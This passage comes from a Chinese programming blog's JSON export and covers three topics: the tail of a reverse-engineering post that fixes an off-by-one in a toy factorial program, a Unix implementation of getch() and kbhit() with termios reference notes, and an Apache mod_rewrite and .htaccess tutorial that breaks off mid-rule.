MessageBox，在模块中找到后依次设置断点，运行程序，在主函数断电处停下 特征法：根据 C 语言的反汇编特征进行判断 修改内容 Fact.exe jge 表示大于或等于时跳转。当输入数字 n 时，EDX 存放值 n，ECX 中的值初始化为 1，[local.3]中的值也为 1，每次循环时，ECX 中的值自加一，[local.3]的值为自身再乘上 ECX 中的值。当 ECX 等于 EDX 时跳出循环，而不再进行下一次乘法，最后[local.3]中的值为(n-1)!，故应该将 jge 修改为 jg 即可 参考网站https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.htmlhttps://blog.csdn.net/qq_34717555/article/details/77727176https://blog.csdn.net/hanchaoman/article/details/9187093","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"}]},{"title":"Unix/Linux下实现Windows中conio.h头文件部分函数","slug":"Unix-Linux下实现Windows中conio-h头文件部分函数","date":"2018-06-19T13:38:18.000Z","updated":"2019-11-07T01:55:53.066Z","comments":true,"path":"2018/06/19/Unix-Linux下实现Windows中conio-h头文件部分函数/","link":"","permalink":"qianfei11.coding.me/2018/06/19/Unix-Linux下实现Windows中conio-h头文件部分函数/","excerpt":"最近在写数据结构大作业，因为在写五子棋的时候不知道怎么实现通过键盘来实现移动和下子，了解到了windows下的conio.h头文件。但是由于我用的是unix系统，需要自己来实现。","text":"最近在写数据结构大作业，因为在写五子棋的时候不知道怎么实现通过键盘来实现移动和下子，了解到了windows下的conio.h头文件。但是由于我用的是unix系统，需要自己来实现。 主要实现getch()和kbhit()两个函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;termios.h&gt; //Linux专用头文件，用于实现getch()、kbhit()#include &lt;unistd.h&gt; //定义了大量针对系统调用的封装的接口 提供对 POSIX 操作系统 API 的访问功能#include &lt;fcntl.h&gt; //定义了很多宏和函数原型 对文件的打开、数据写入、数据读取、关闭文件的操作#include &lt;stdio.h&gt;int getch() //输入不需要回车键便返回&#123; struct termios tm, tm_old; if(tcgetattr(STDIN_FILENO, &amp;tm) &lt; 0) //STDIN_FILENO是终端文件描述符，是一个打开文件句柄 return -1; tm_old = tm; cfmakeraw(&amp;tm); //设置串口属性 将终端设置成原始模式，此时终端是不可回显的 if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm) &lt; 0) //更改终端设置 return -1; int ch = getchar(); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm_old) &lt; 0) //恢复终端原始设置 return -1; return ch;&#125;int kbhit() //检测键盘是否有输入&#123; struct termios oldt, newt; //控制终端状态的数据结构 int ch; int oldf; tcgetattr(STDIN_FILENO, &amp;oldt); //得到当前终端的状态 newt = oldt; //设置新的终端属性：ICANON和ECHO取反，表示关闭输入行编辑模式，即能够直接读入字符 newt.c_lflag &amp;= ~(ICANON | ECHO); //ICANON：如果在输入中看到&apos;\\n&apos;或者&apos;EOF&apos;，会返回缓冲区内容 //ECHO：控制回显 tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt); //TSCSANOW：告诉函数立即改变终端的STDIN_FILENO的属性值 oldf = fcntl(STDIN_FILENO, F_GETFL, 0); //获取flags，即open函数的第二个参数 //fcntl()的返回值与命令有关。如果出错，所有命令都返回－1，如果成功则返回某个其他值 fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK); //增加一个flags，把文件设置成非阻塞 //F_SETFL设置文件状态标记 ch = getchar(); tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt); //恢复终端设置 fcntl(STDIN_FILENO, F_SETFL, oldf); if(ch != EOF) &#123; ungetc(ch, stdin); //把字符退回到输入流 return 1; &#125; return 0;&#125; getch()1234567891011121314int getch() //输入不需要回车键便返回&#123; struct termios tm, tm_old; if(tcgetattr(STDIN_FILENO, &amp;tm) &lt; 0) //STDIN_FILENO是终端文件描述符，是一个打开文件句柄 return -1; tm_old = tm; cfmakeraw(&amp;tm); //设置串口属性 将终端设置成原始模式，此时终端是不可回显的 if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm) &lt; 0) //更改终端设置 return -1; int ch = getchar(); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm_old) &lt; 0) //恢复终端原始设置 return -1; return ch;&#125; termios结构体1234567struct termios&#123; tcflag_t c_iflag; /* Input modes */ tcflag_t c_oflag; /* Output modes */ tcflag_t c_cflag; /* Control modes */ tcflag_t c_lflag; /* Local modes */ cc_t c_cc[NCCS]; /* Control characters */&#125;; 格字段的选项如下： c_iflag 键值 说明 BRKINT 接到BREAK时产生SIGINT； ICRNL 将输入的CR转换为NL； IGNBRK 忽略BREAK条件； IGNCR 忽略CR； IGNPAR 忽略奇偶错字符； IMAXBEL 在输入队列空时振铃； INLCR 将输入的NL转换为CR； INPCK 打开输入奇偶校验； ISTRIP 剥除输入字符的第8位； IUCLC 将输入的大写字符转换成小写字符(仅SVR4)； IXANY 使任一字符都重新起动输出； IXOFF 使起动/停止输入控制流起作用； IXON 使起动/停止输出控制流起作用； PARMRK 标记奇偶错； c_oflag 键值 说明 BSDLY 退格延迟屏蔽(仅SVR4)； CRDLY CR延迟屏蔽(仅SVR4)； FFDLY 换页延迟屏蔽(仅SVR4)； NLDLY NL延迟屏蔽(仅SVR4)； OCRNL 将输出的CR转换为NL(仅SVR4)； OFDEL 填充符为DEL，否则为NUL(仅SVR4)； OFILL 对于延迟使用填充符(仅SVR4)； OLCUC 将输出的小写字符转换为大写字符(仅SVR4)； ONLCR 将NL转换为CR-NL； ONLRET NL执行CR功能(仅SVR4)； ONOCR 在0列不输出CR(仅SVR4)； ONOEOT 在输出中删除EOT字符(仅4.3+BSD)； OPOST 执行输出处理； OXTABS 将制表符扩充为空格(仅4.3+BSD)； TABDLY 水平制表符延迟屏蔽(仅SVR4)； VTDLY 垂直制表符延迟屏蔽(仅SVR4)； c_cflag 键值 说明 CCTS_OFLOW 输出的CTS流控制(仅4.3+BSD)； CIGNORE 忽略控制标志(仅4.3+BSD)； CLOCAL 忽略解制解调器状态行； CREAD 启用接收装置； CRTS_IFLOW 输入的RTS流控制(仅4.3+BSD)； CSIZE 字符大小屏蔽； CSTOPB 送两个停止位，否则为1位； HUPCL 最后关闭时断开； MDMBUF 经载波的流控输出(仅4.3+BSD)； PARENB 进行奇偶校； PARODD 奇校，否则为偶校； c_lflag 键值 说明 ALTWERASE 使用替换WERASE算法(仅4.3+BSD)； ECHO 进行回送； ECHOCTL 回送控制字符为^(char)； ECHOE 可见擦除符； ECHOK 回送kill符； ECHOKE kill的可见擦除； ECHONL 回送NL； ECHOPRT 硬拷贝的可见擦除方式； FLUSHO 刷清输出； ICANON 规范输入； IEXTEN 使扩充的输入字符处理起作用； ISIG 使终端产生的信号起作用； NOFLSH 在中断或退出键后不刷清； NOKERNINFO STATUS不使内核输出(仅4.3+BSD)； PENDIN 重新打印； TOSTOP 对于后台输出发送SIGTTOU； XCASE 规范大/小写表示(仅SVR4)； 各标志的含义如下： 标志 含义 ALTWERASE (c_lflag, 4.3+BSD)此标志设置时，若输入了WERASE字符，则使用一个替换的字擦除算法。它不是向后移动到前一个白空字符为止，而是向后移动到第一个非字母、数字符为止。 BRKINT (c_iflag, POSIX.1)若此标志设置，而IGNBRK未设置，则在接到BREAK时，输入、输出队列被刷清，并产生一个SIGINT信号。如果此终端设备是一个控制终端，则将此信号送给前台进程组各进程。如果IGNBRK和BRKINT都没有设置，但是设置了PARMRK，则BREAK被读作为三个字节序列/377，/0和/0，如果PARMRK也没有设置，则BREAK被读作为单个字符/0。 BSDLY (c_oflag, SVR4)退格延迟屏蔽，此屏蔽的值是BS0或BS1。 CCTS_OFLOW (c_cflag, 4.3+BSD)输出的CTS流控制。 CIGNORE (c_cflag, 4.3+BSD)忽略控制标志。 CLOCAL (c_cflag, POSIX.1)如若设置，则忽略调制解调器状态线。这通常意味着该设备是本地连接的。若此标志未设置，则打开一个终端设备常常会阻塞到调制解调器回应。 CRDLY (c_oflag, SVR4)回车延迟屏蔽。此屏蔽的值是CR0、CR1、CR2和CR3。 CREAD (c_cflag, POSIX.1)如若设置，则接收装置被启用，可以接收字符。 CRTS_IFLOW (c_cflag, 4.3+BSD)输入的RTS流控制。 CSIZE (c_cflag, POSIX.1)此字段是一个屏蔽标志，它指明发送和接收的每个字节的位数。此长度不包括可能有的奇偶校验位。由此屏蔽定义的字段值是CS5、CS6、CS7和CS8，分别表示每个字节包含5、6、7和8位。 CSTOPB (c_cflag, POSIX.1)如若设置，则使用两位作为停止位，否则只使用一位作为停止位。 ECHO (c_lflag, POSIX.1)如若设置，则将输入字符回送到终端设备。在规范方式和非规范方式下都可以回送字符。 ECHOCTL (c_lflag, SVR4和4.3+BSD)如若设置并且ECHO也设置，则除ASCII TAB、ASCII NL、START和STOP字符外，其他ASCII控制符(ASCII字符集中的0～037)都被回送为^X，其中，X是相应控制字符代码值加0100所构成的字符。这就意味着ASCII Ctrl-A字符(01)被回送为^A。ASCII DELETE字符(0177)则回送为^?。如若此标志未设置，则ASCII控制字符按其原样回送。如同ECHO标志，在规范方式和非规范方式下此标志对控制字符回送都起作用。应当了解的是，某些系统回送EOF字符产生的作用有所不同，其原因是EOF的典型值是Ctrl-D，而这是ASCII EOT字符，它可能使某些终端挂断。 ECHOE (c_lflag, POSIX.1)如若设置并且ICANON也设置，则ERASE字符从显示中擦除当前行中的最后一个字符。这通常是在终端驱动程序中写三个字符序列：退格，空格，退格实现的。如若支持WERASE字符，则ECHOE用一个或若干个上述三字符序列擦除前一个字。如若支持ECHOPRT标志，则在这里所说明的ECHOE动作假定ECHOPRT标志没有设置。 ECHOK (c_lflag, POSIX.1)如若设置并且ICANON也设置，则KILL字符从显示中擦除当前行，或者输出NL字符(用以强调已擦除整个行)。如若支持ECHOKE标志，则这里的说明假定ECHOKE标志没有设置。 ECHOKE (c_lflag, SVR4和4.3+BSD)如若设置并且ICANON也设置，则回送KILL字符的方式是擦去行中的每一个字符。擦除每个字符的方法则由ECHOE和ECHOPRT标志选择。 ECHONL (c_lflag, POSIX.1)如若设置并且ICANON也设置，即使没有设置ECHO也回送NL字符。 ECHOPRT (c_lflag, SVR4和4.3+BSD)如若设置并且ICANON和ECHO也都设置，则ERASE字符(以及WERASE字符，若受到支持)使所有正被擦除的字符按它们被擦除的方式打印。在硬拷贝终端上这常常是有用的，这样可以确切地看到哪些字符正被擦去。 FFDLY (c_oflag, SVR4)换页延迟屏蔽。此屏蔽标志值是FF0或FF1。 FLUSHO (c_lflag, SVR4和4.3+BSD)如若设置，则刷清输出。当键入DISCARD字符时设置此标志，当键入另一个DISCARD字符时，此标志被清除。设置或清除此终端标志也可设置或清除此条件。 HUPCL (c_cflag, POSIX.1)如若设置，则当最后一个进程关闭此设备时，调制解调器控制线降至低电平(也就是调制解调器的连接断开)。 ICANON (c_lflag, POSIX.1)如若设置，则按规范方式工作。这使下列字符起作用：EOF、EOL、EOL2、ERASE、KILL、REPRINT、STATUS和WERASE。输入字符被装配成行。如果不以规范方式工作，则读请求直接从输入队列取字符。在至少接到MIN个字节或已超过TIME值之前，read将不返回。 ICRNL (c_iflag, POSIX.1)如若设置并且IGNCR未设置，即将接收到的CR字符转换成一个NL字符。 IEXTEN (c_lflag, POSIX.1)如若设置，则识别并处理扩充的、实现定义的特殊字符。 IGNBRK (c_iflag, POSIX.1)在设置时，忽略输入中的BREAK条件。关于BREAK条件是产生信号还是被读作为数据，请见BRKINT。 IGNCR (c_iflag, POSIX.1)如若设置，忽略接收到的CR字符。若此标志未设置，而设置了ICRNL标志则将接收到的CR字符转换成一个NL字符。 IGNPAR (c_iflag, POSIX.1)在设置时，忽略带有结构错误(非BREAK)或奇偶错的输入字节。 IMAXBEL (c_iflag, SVR4和4.3+BSD)当输入队列满时响铃。 INLCR (c_iflag, POSIX.1)如若设置，则接收到的NL字符转换成CR字符。 INPCK (c_iflag, POSIX.1)当设置时，使输入奇偶校验起作用。如若未设置INPCK，则使输入奇偶校验不起作用。奇偶“产生和检测”和“输入奇偶性检验”是不同的两件事。奇偶位的产生和检测是由PARENB标志控制的。设置该标志后使串行界面的设备驱动程序对输出字符产生奇偶位，对输入字符则验证其奇偶性。标志PARODD决定该奇偶性应当是奇还是偶。如果一个其奇偶性为错的字符已经来到，则检查INPCK标志的状态。若此标志已设置，则检查IGNPAR标志(以决定是否应忽略带奇偶错的输入字节)，若不应忽略此输入字节，则检查PARMRK标志以决定向读进程应传送那种字符。 ISIG (c_lflag, POSIX.1)如若设置，则判别输入字符是否是要产生终端信号的特殊字符(INTR，QUIT，SUSP和DSUSP)，若是，则产生相应信号。 ISTRIP (c_iflag, POSIX.1)当设置时，有效输入字节被剥离为7位。当此标志未设置时，则保留全部8位。 IUCLC (c_iflag, SVR4)将输入的大写字符映射为小写字符。 IXANY (c_iflag, SVR4和4.3+BSD)使任一字符都能重新起动输出。 IXOFF (c_iflag, POSIX.1)如若设置，则使起动-停止输入控制起作用。当终端驱动程序发现输入队列将要填满时，输出一个STOP字符。此字符应当由发送数据的设备识别，并使该设备暂停。此后，当已对输入队列中的字符进行了处理后，该终端驱动程序将输出一个START字符，使该设备恢复发送数据。 IXON (c_iflag, POSIX.1)如若设置，则使起动-停止输出控制起作用。当终端驱动程序接收到一个STOP字符时，输出暂停。在输出暂停时，下一个START字符恢复输出。如若未设置此标志，则START和STOP字符由进程读作为一般字符。 MDMBUF (c_cflag, 4.3+BSD)按照调制解调器的载波标志进行输出流控制。 NLDLY (c_oflag, SVR4)新行延迟屏蔽。此屏蔽的值是NL0和NL1。 NOFLSH (c_lflag, POSIX.1)按系统默认，当终端驱动程序产生SIGINT和SIGQUIT信号时，输入、出队列都被刷新。另外，当它产生SIGSUSP信号时，输入队列被刷新。如若设置了NOFLSH标志，则在这些信号产生时，不对输入、出队列进行刷新。 NOKERNINFO (c_lflag, 4.3+BSD)当设置时，此标志阻止STATUS字符使前台进程组的状态信息显示在终端上。但是不论本标志是否设置，STATUS字符使SIGINFO信号送至前台进程组中的所有进程。 OCRNL (c_oflag, SVR4)如若设置，将输出的CR字符映照为NL。 OFDEL (c_oflag, SVR4)如若设置，则输出填充字符是ASCII DEL，否则它是ASCII NUL，见OFILL标志。 OFILL (c_oflag, SVR4)如若设置，则为实现延迟，发送填充字符(ASCII DEL或ASCII NUL，见OFDEL标志)，而不使用时间延迟。见6个延迟屏蔽：BSDLY，CRDLY，FFDLY，NLDLY，TABDLY以及VTDLY。 OLCUC (c_oflag, SVR4)如若设置，将小写字符映射为大写。 ONLCR (c_oflag, SVR4和4.3+BSD)如若设置，将输出的NL字符映照为CR-NL。 ONLRET (c_oflag, SVR4)如若设置，则输出的NL字符将执行回车功能。 ONOCR (c_oflag, SVR4)如若设置，则在0列不输出CR。 ONOEOT (c_oflag, 4.3+BSD)如若设置，则在输出中删除EOT字符(^D)。在将Ctrl-D解释为挂断的终端上这可能是需要的。 OPOST (c_oflag, POSIX.1)如若设置，则进行实现定义的输出处理。 OXTABS (c_oflag, 4.3+BSD)如若设置，制表符在输出中被扩展为空格。这与将水平制表延迟(TABDLY)设置为XTABS或TAB3产生同样效果。 PARENB (c_cflag, POSIX.1)如若设置，则对输出字符产生奇偶位，对输入字符则执行奇偶性检验。若PARODD已设置，则奇偶校验是奇校验，否则是偶校验。也见INPCK、IGNPAR和PARMRK标志部分。 PARMRK (c_iflag, POSIX.1)，当设置时，并且IGNPAR未设置，则结构性错(非BREAK)和奇偶错的字节由进程读作为三个字符序列/377, /0和X，其中X是接收到的具有错误的字节。如若ISTRIP未设置，则一个有效的/377被传送给进程时为/377，/377。如若IGNPAR和PARMRK都未设置，则结构性错和奇偶错的字节都被读作为一个字符/0。 PARODD (c_cflag, POSIX.1)如若设置，则输出和输入字符的奇偶性都是奇，否则为偶。注意，PARENB标志控制奇偶性的产生和检测。 PENDIN (c_lflag, SVR4和4.3+BSD)如若设置，则在下一个字符输入时，尚未读的任何输入都由系统重新打印。这一动作与键入REPRINT字符时的作用相类似。 TABDLY (c_oflag, SVR4)水平制表延迟屏蔽。此屏蔽的值是TAB0、TAB1、TAB2或TAB3。XTABS的值等于TAB3。此值使系统将制表符扩展成空格。系统假定制表符所扩展的空格数到屏幕上最近一个8的倍数处为止。不能更改此假定。 TOSTOP (c_lflag, POSIX.1)如若设置，并且该实现支持作业控制，则将信号SIGTTOU送到试图与控制终端的一个后台进程的进程组。按默认，此信号暂停该进程组中所有进程。如果写控制终端的进程忽略或阻塞此信号，则终端驱动程序不产生此信号。 VTDLY (c_oflag, SVR4)垂直制表延迟屏蔽。此屏蔽的值是VT0或VT1。 XCASE (c_lflag, SVR4)如若设置，并且ICANON也设置，则认为终端是大写终端，所以输入都变换为小写。为了输入一个大写字符，在其前加一个/。与之类似，输出一个大写字符也在其前加一个/(这一标志已经过时，现在几乎所有终端都支持大、小写字符)。 cfmakeraw()cfmakeraw sets the terminal attributes as follows:12345termios_p-&gt;c_iflag &amp;= ~(IGNBRK|BRKINT|PARMRK|ISTRIP|INLCR|IGNCR|ICRNL|IXON);termios_p-&gt;c_oflag &amp;= ~OPOST;termios_p-&gt;c_lflag &amp;= ~(ECHO|ECHONL|ICANON|ISIG|IEXTEN);termios_p-&gt;c_cflag &amp;= ~(CSIZE|PARENB);termios_p-&gt;c_cflag |= CS8; 就是将终端设置为原始模式，该模式下所有的输入数据以字节为单位被处理。在原始模式下，终端是不可回显的，而且所有特定的终端输入/输出模式不可用。 POSIX终端接口很多系统都支持POSIX终端（串口）接口。程序可以利用这个接口来改变终端的参数，比如，波特率，字符大小等等。要使用这个端口的话，你必须将头文件包含到你的程序中。这个头文件中定义了终端控制结构体和POSIX控制函数。 与串口操作相关的最重要的两个POSIX函数可能就是tcgetattr()和tcsetattr()。顾名思义，这两个函数分别用来取得设设置终端的属性。 1、linux中的串口设备文件存放于/dev目录下，其中 串口一，串口二对应设备名依次为 “/dev/ttyS0”、“/dev/ttyS1”。在linux下操作串口与操作文件相同。 2、在使用串口之前必须设置相关配置，包括：波特率、 数据位、校验位、停止位等。串口设置由termios结构体实现。 常用的串口控制函数： 123456Tcgetattr 取属性(termios 结构)Tcsetattr 设置属性(termios 结构)cfgetispeed 得到输入速度Cfgetospeed 得到输出速度Cfsetispeed 设置输入速度Cfsetospeed 设置输出速度 3、串口的配置 (1)保存原先串口配置使用tcgetattr(fd,&amp; oldtio)函数： 12struct termiosnewtio,oldtio;tcgetattr(fd,&amp; oldtio); (2)激活选项有CLOCAL和CREAD,用于本地连接和接收使能。 1newtio.c_cflag|=CLOCAL|CREAD; (3)设置波特率，使用函数cfsetispeed、cfsetospeed 12cfsetispeed(&amp;newtio,B115200);cfsetospeed(&amp;newtio,B115200); (4)设置数据位，需使用掩码设置。 12newtio.c_cflag&amp;=~CSIZE;newtio.c_cflag|=CS8; (5)设置奇偶校验位，使用c_cflag和c_iflag。 设置奇校验： 123newtio.c_cflag|=PARENB; newtio.c_cflag|=PARODD;newtio.c_iflag|=(INPCK|ISTRIP); 设置偶校验： 123newtio.c_iflag|=(INPCK|ISIRIP);newtio.c_cflag|=PARENB;newtio.c_cflag&amp;=~PARODD; (6)设置停止位，通过激活c_cflag中的CSTOPB实现。若停止位为1，则清除CSTOPB，若停止位为 2，则激活CSTOPB。 1newtio.c_cflag&amp;=~CSTOPB; (7)设置最少字符和等待时间，对于接收字符和等待时间没有特别要求时，可设为0。 12newtio.c_cc[VTIME]=0;newtio.c_cc[VMIN]=0; (8)处理要写入的引用对象tcflush函数刷清（抛弃）输入缓存（终端驱动程序已接收到，但用户程序尚未读）或输出缓存（用户程序已经写，但尚未发送）。 1int tcflush(int filedes,int queue) queue数应当是下列三个常数之一： 123TCIFLUSH 刷清输入队列。TCOFLUSH刷清输出队列。TCIOFLUSH刷清输入、输出队列。 如：tcflush(fd,TCIFLUSH); (9)激活配置。在完成配置后，需激活配置使其生效。使用tsettattr()函数。原型： 12int tcgetattr(int filedes,struct termios *termptr);int tcsetattr(int filedes,int opt,const struct termios* termptr); tcsetattr的参数opt使我们可以指定在什么时候新的终端属性才起作用。opt可以指定为下列常数中的一个： TCSANOW更改立即发生。 TCSADRAIN发送了所有输出后更改才发生。若更改输出参数则应使用此选择项。 4 、在配置完串口的相关属性后，就可对串口进行打开,读写操作了。其使用方式与文件操作一样，区别在于串口是一个终端设备. (1)打开串口 1234fd=open(&quot;/dev/ttyS0&quot;,O_RDWR|O_NOCTTY |O_NDELAY);Open函数中除普通参数外,另有两个参数O_NOCTTY和O_NDELAY.O_NOCTTY:通知linux系统,这个程序不会成为这个端口的控制终端。O_NDELAY:通知linux系统不关心DCD信号线所处的状态(端口的另一端是否激活或者停止）。 (2)恢复串口的状态为阻塞状态,用于等待串口数据的读入。用fcntl函数: 1fcntl(fd,F_SETFL,0）; (3)接着,测试打开的文件描述府是否引用一个终端设备,以进一步确认串口是否正确打开. 1isatty(STDIN_FILENO); (4)串口的读写与普通文件一样,使用read,write函数. 12read(fd,buf,8);write(fd,buf,8); kbhit()1234567891011121314151617181920212223int kbhit() //检测键盘是否有输入&#123; struct termios oldt, newt; //控制终端状态的数据结构 int ch; int oldf; tcgetattr(STDIN_FILENO, &amp;oldt); //得到当前终端的状态 newt = oldt; //设置新的终端属性：ICANON和ECHO取反，表示关闭输入行编辑模式，即能够直接读入字符 newt.c_lflag &amp;= ~(ICANON | ECHO); //ICANON：如果在输入中看到&apos;\\n&apos;或者&apos;EOF&apos;，会返回缓冲区内容 //ECHO：控制回显 tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt); //TSCSANOW：告诉函数立即改变终端的STDIN_FILENO的属性值 oldf = fcntl(STDIN_FILENO, F_GETFL, 0); //获取flags，即open函数的第二个参数 //fcntl()的返回值与命令有关。如果出错，所有命令都返回－1，如果成功则返回某个其他值 fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK); //增加一个flags，把文件设置成非阻塞 //F_SETFL设置文件状态标记 ch = getchar(); tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt); //恢复终端设置 fcntl(STDIN_FILENO, F_SETFL, oldf); if(ch != EOF) &#123; ungetc(ch, stdin); //把字符退回到输入流 return 1; &#125; return 0;&#125; fcntl()1、获取文件的flags，即open函数的第二个参数: 1flags = fcntl(fd,F_GETFL,0); 2、设置文件的flags: 1fcntl(fd,F_SETFL,flags); 3、增加文件的某个flags，比如文件是阻塞的，想设置成非阻塞: 12345flags = fcntl(fd,F_GETFL,0);flags |= O_NONBLOCK;fcntl(fd,F_SETFL,flags); 4、取消文件的某个flags，比如文件是非阻塞的，想设置成为阻塞: 12345flags = fcntl(fd,F_GETFL,0);flags &amp;= ~O_NONBLOCK;fcntl(fd,F_SETFL,flags); 参考网站：https://blog.csdn.net/g1036583997/article/details/41277949https://www.cnblogs.com/dartagnan/archive/2013/04/25/3042417.htmlhttps://blog.csdn.net/DiegoTJ/article/details/5454917https://gezhenzhen.wikispaces.com/Linux%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86http://www.codexiu.cn/linux/blog/21923/https://blog.csdn.net/liangxiaozhang/article/details/8202965","categories":[],"tags":[{"name":"c","slug":"c","permalink":"qianfei11.coding.me/tags/c/"},{"name":"linux","slug":"linux","permalink":"qianfei11.coding.me/tags/linux/"}]},{"title":"Apache Rewrite（路由重写）","slug":"Apache-Rewrite（路由重写）","date":"2018-05-16T05:36:06.000Z","updated":"2019-08-26T05:54:53.145Z","comments":true,"path":"2018/05/16/Apache-Rewrite（路由重写）/","link":"","permalink":"qianfei11.coding.me/2018/05/16/Apache-Rewrite（路由重写）/","excerpt":"Apache Rewrite 能够实现 URL 的跳转和隐藏真实地址。它基于 Perl 语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等。","text":"Apache Rewrite 能够实现 URL 的跳转和隐藏真实地址。它基于 Perl 语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等。 理解 Apache Rewrite 的三个核心RewriteEngine这个是 rewrite 功能的总开关，用来开启是否启动 url rewrite。 1RewriteEngine on RewriteCondRewriteCond 就是一个过滤条件，简单来说，当 URL 满足 RewriteCond 配置的条件的情况，就会执行 RewriteCond 下面紧邻的 RewriteRule 语句。 RewriteCond 和 RewriteRule 是上下对应的关系。可以有 1 个或者好几个 RewriteCond 来匹配一个 RewriteRule。 RewriteCond %{待测试项目} 正则表达式条件。 123RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^Mozilla//5/.0.*RewriteRule index.php index.m.php 如果设置上面的匹配规则，到来的 http 请求中的HTTP_USER_AGENT匹配^Mozilla//5/.0.*正则表达式的话，则执行下面的 RewriteRule，也就是说访问路径会跳转到index.m.php这个文件。 RewriteRule1RewriteRule Pattern Substitution [flags] Pattern 是一个正则匹配。Substitution 是匹配的替换 [flags]是一些参数限制。 1RewriteRule ^room/video/(\\d+)\\.html web/index\\.php?c=room&amp;a=video&amp;r=$1 [QSA,NC,L] 意思是 以 room 开头的room/video/123.html这样子，变成web/index.php?c=room&amp;a=video&amp;r=123。 1RewriteRule \\.(jpg|gif) http://image.baidu.com/ [R,NC,L] 意思是以为是访问.jpg 或者 gif 的文件，都会调整到http://image.baidu.com。 重写规则的作用范围 可以使用在 Apache 主配置文件 httpd.conf 中。 可以使用在 httpd.conf 里定义的虚拟主机配置中。 可以使用在基本目录的跨越配置文件.htaccess 中。 这三种方式，都需要在写规则前，用“RewriteEngine on”指令来打开 rewrite 功能。 Apache Rewrite 规则修正符 R=code 强制外部重定向 强制在替代字符串加上http://thishost[:thisport]/前缀重定向到外部的 URL。如果 code 不指定，将用缺省的 302 HTTP 状态码。 F(force URL to be forbidden)禁用 URL,返回 403HTTP 状态码。 G(force URL to be gone) 强制 URL 为 GONE，返回 410HTTP 状态码。 P(force proxy) 强制使用代理转发。 L(last rule) 表明当前规则是最后一条规则，停止分析以后规则的重写。 N(next round) 重新从第一条规则开始运行重写过程。 C(chained with next rule) 与下一条规则关联 如果规则匹配则正常处理，该标志无效，如果不匹配，那么下面所有关联的规则都跳过。 T=MIME-type(force MIME type) 强制 MIME 类型。 NS (used only if no internal sub-request) 只用于不是内部子请求。 NC(no case) 不区分大小写。 QSA(query string append) 追加请求字符串。 NE(no URI escaping of output) 不在输出转义特殊字符。 例如： 1RewriteRule /foo/(.*) /bar?arg=P1%3d$1 [R,NE] #将能正确的将/foo/zoo转换成/bar?arg=P1=zoo PT(pass through to next handler) 传递给下一个处理。 例如： 12RewriteRule ^/abc(.*) /def$1 [PT] # 将会交给/def规则处理Alias /def /ghi S=num(skip next rule(s)) 跳过 num 条规则。 E=VAR:VAL(set environment variable) 设置环境变量。 注：P 是代理模式转发，必须用 url 全称，并且要保证 modProxy 打开，也就是下面 httpd.conf 中的如下两个指令： 12LoadModule proxy_module modules/mod_proxy.soLoadModule proxy_http_module modules/mod_proxy_http.so 如果对应 proxy 模块没加载，则会出现 403 禁止页面。 特殊字符的含义*代表前面 0 或更多个字符。 +代表前面 1 或更多个字符。 ？代表前面 0 或 1 个字符。 ^代表字符串的开始位置。 \\$代表字符串结束的位置。 。为通配符，代表任何字符。 \\将跟在其后的字符还原为字符本身，例如“+”代表的就是“+”，而非其它意思。 ^在方括号里表示非的意思。例如［^.］代表非通配符。 htaccess.htaccess 文件(或者”分布式配置文件”）,全称是 Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。概述来说，htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 Apache Rewrite 的方式将 apache 的配置文件 httpd.conf 中 1#LoadModule rewrite_module modules/mod_rewrite.so 前的’#’去掉。找到 ‘AllowOverride None’ 改成 ‘AllowOverride All’。 注：’AllowOverride’的参数设置为’ALL’，表示整台服务器上都支持 URL 规则重写。 对于不同的网址，需要在 APACHE 中增加如下内容： 123456&lt;Directory “E:/Apache Group/Apache2/htdocs/leapsoul”&gt;/*引号里代表你的web存放目录*//*如果是Linux，只要你定位到你网站目录即可*/Options FollowSymLinksAllowOverride None&lt;/Directory&gt; Apache 服务器要读每个网站下目录下的.htaccess文件。如果没有这个文件，或者这个文档没有定义任何关于 URL 重写的规则就不会有任何效果。 只要启用 mod_rewrite，然后简单的通过一个.htaccess文件再加上一些简单的规则就可以移除 URL 中的 index.php 了。 针对整个 apache 服务器的配置在网站配置下加入 123RewriteEngine onRewriteRule index.html index.phpRewriteRule (d+).html$ info.php?id=$1 即通过 index.html 访问就是 index.php；通过 1.html 访问就是 info.php?id=1。 针对 apache 服务器下的某一目录的配置在.htaccess 文件中加入 123RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !-f#这里将除了实际文件以为的所有其他请求都指向下行代码给出的脚本，这里是index.phpRewriteRule .* index.php 在 Windows 资源管理器里面不允许你建立.htaccess这样只有扩展名的文件。所以你必须先将文件保存为其他名字，例如app.htaccess。然后进入 cmd，输入ren a.htaccess .htaccess命令来对文件改名。或者新建一个记事本，另存为.htaccess即可。 例子如果文件不存在重定向到 404 页面123RewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule .? /404.php [L] 这里-f 匹配的是存在的文件名，-d 匹配的存在的路径名。这段代码在进行 404 重定向之前，会判断你的文件名以及路径名是否存在【请注意这里】。你还可以在 404 页面上加一个?url=\\$1 参数： 1RewriteRule ^/?(.*)$ 